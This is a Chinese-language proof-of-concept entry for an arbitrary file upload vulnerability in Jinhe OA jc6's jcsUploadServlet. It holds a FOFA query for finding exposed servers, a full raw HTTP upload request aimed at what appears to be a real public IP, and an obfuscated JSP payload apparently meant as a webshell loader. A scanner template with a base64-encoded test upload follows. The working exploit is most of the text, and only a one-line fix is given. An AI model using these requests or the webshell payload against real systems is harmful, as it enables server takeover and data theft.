# 金和jc6 jcsUploadServlet 存在任意文件上传

    ## fofa

```
body="jc6/platform"
```

## poc

http://222.180.197.70:18888/jc6/upload/2023-08-16/ttt22.jsp

```
POST /jc6/servlet/jcsUploadServlet?mtpId= HTTP/1.1
Host: 222.180.197.70:18888
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=1F974730AB7C793ADF87BB3C82E7619B
Connection: close
Content-Type: multipart/form-data; boundary=54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
Content-Length: 2105

--54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
Content-Disposition: form-data; name="iframeId"

ttt22
--54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
Content-Disposition: form-data; name="fileSuffix"

jsp
--54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
Content-Disposition: form-data; name="myFile"; filename="1.txt"
Content-Type: application/octet-stream

;$RsqhmfG08U5<qdptdrs-fdsO`q`ldsdq'!o`rr!(:he'G08U5 <mtkk(zbk`rrDhAGFJ2Bdwsdmcr.)YcYjC1Y82D).Bk`rrKn`cdqzDhAGFJ2B'Bk`rrKn`cdqKbwRoj(zrtodq'KbwRoj(:|otakhbBk`rrG08U5'axsdZ\a(zqdstqmrtodq-cdehmdBk`rr'a+/+a-kdmfsg(:||axsdZ\axsdr<mtkk:sqxzhmsZ\``<mdvhmsZ\z88+0/0+015+51+014+010+88+004+51+71+70+56+74+27+25+73+006+004+016+005+006+87|:Rsqhmfbbrsq<!!:enq'hmsh</:h;``-kdmfsg:h**(z``Zh\<``Zh\]/w/0/:bbrsq<bbrsq*'bg`q(``Zh\:|Bk`rr@8BSn<Bk`rr-enqM`ld'bbrsq(:Rsqhmfj<mdvRsqhmf'mdvaxsdZ\z0//+0/0+88+000+0//+0/0+55+006+0/1+0/1+0/0+003|(:axsdr<'axsdZ\(@8BSn-fdsLdsgnc'j+Rsqhmf-bk`rr(-hmunjd'@8BSn-mdvHmrs`mbd'(+G08U5(:|b`sbg'Dwbdoshnmd(zhmsZ\``<mdvhmsZ\z011+002+0/1+002+51+0/0+0//+010+013+51+71+002+88+006+27+25|:Rsqhmfbbrsq<!!:enq'hmsh</:h;``-kdmfsg:h**(z``Zh\<``Zh\]/w/0/:bbrsq<bbrsq*'bg`q(``Zh\:|Bk`rrbk`yy<Bk`rr-enqM`ld'bbrsq(:Naidbscdbncdq<bk`yy-fdsLdsgnc'!fdsCdbncdq!(-hmunjd'mtkk(:axsdr<'axsdZ\(cdbncdq-fdsBk`rr'(-fdsLdsgnc'!cdbncd!+Rsqhmf-bk`rr(-hmunjd'cdbncdq+G08U5(:|Bk`rr`Bk`rr<mdvDhAGFJ2B'Sgqd`c-btqqdmsSgqd`c'(-fdsBnmsdwsBk`rrKn`cdq'((-G08U5'axsdr(:Naidbsn<`Bk`rr-mdvHmrs`mbd'(:n-dpt`kr'o`fdBnmsdws(:|dkrdz|$=	
--54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
Content-Disposition: form-data; name="attachmentId"


--54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
Content-Disposition: form-data; name="isSingle"



--54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
Content-Disposition: form-data; name="fileOldName"


--54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95--
```



## exp

```
detail:
  ID: 4946
  Author: 匿名作者
  Name: 金和jc6存在任意文件上传
  Description: 金和OA是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。因未对接口进行过滤限制，导致了任意文件的上传，可上传木马从而控制服务器
  Identifier:
    DVB: DVB-2023-4946
  VulnClass:
  - 任意文件上传
  Category:
  - Web服务器集群
  Manufacturer: 金和软件
  Product: jc6
  Type: 1
  Status: 1
  Scanable: 1
  Level: 4
  DisclosureDate: '2023-08-15'
  Region: 中国大陆
  Is0day: true
  IncludeExp: false
  Weakable: false
  IsXc: false
  IsCommon: false
  IsCallBack: false
  Condition: body="jc6/platform"
  Solutions:
  - 对上传⽂件的⼤⼩和类型进⾏校验，定义上传⽂件类型⽩名单。
poc:
  relative: req0 && req1
  session: false
  get_variables:
  - year: getNowTime("Year")
  - month: getNowTime("Month")
  - day: getNowTime("Day")
  - randomstr: randomLowerCase(5)
  - payload: base64Decode("LS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iaWZyYW1lSWQiDQoNCnR0dDY2Ng0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZVN1ZmZpeCINCg0KanNwDQotLTU0ZjZiMDBlMzVjYTc2NWQ2NGE5Nzc2YzU5M2JmZTI5OGIyNGIwNmJjMTdiMjlhMDM2NGM0MGNkZWE5NQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJteUZpbGUiOyBmaWxlbmFtZT0iMS50eHQiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSAgb3V0LnByaW50bG4oInRlc3QxMjMzMzMzIik7bmV3ICBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICAlPg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iYXR0YWNobWVudElkIg0KDQoNCi0tNTRmNmIwMGUzNWNhNzY1ZDY0YTk3NzZjNTkzYmZlMjk4YjI0YjA2YmMxN2IyOWEwMzY0YzQwY2RlYTk1DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImlzU2luZ2xlIg0KDQoNCg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZU9sZE5hbWUiDQoNCg0KLS01NGY2YjAwZTM1Y2E3NjVkNjRhOTc3NmM1OTNiZmUyOThiMjRiMDZiYzE3YjI5YTAzNjRjNDBjZGVhOTUtLQ0K")
  requests:
  - method: POST
    timeout: 10
    path: /jc6/servlet/jcsUploadServlet?mtpId=
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/69.0.1141.87 Safari/537.36
      Content-Type: multipart/form-data; boundary=54f6b00e35ca765d64a9776c593bfe298b24b06bc17b29a0364c40cdea95
    data: '{{payload}}'
    follow_redirects: true
    matches: (code.eq("200") && body.contains("OK"))
  - method: GET
    timeout: 10
    path: /jc6/upload/{{year}}-{{month}}-{{day}}/ttt666.jsp
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/74.0.3187.54 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("test1233333"))
``
```
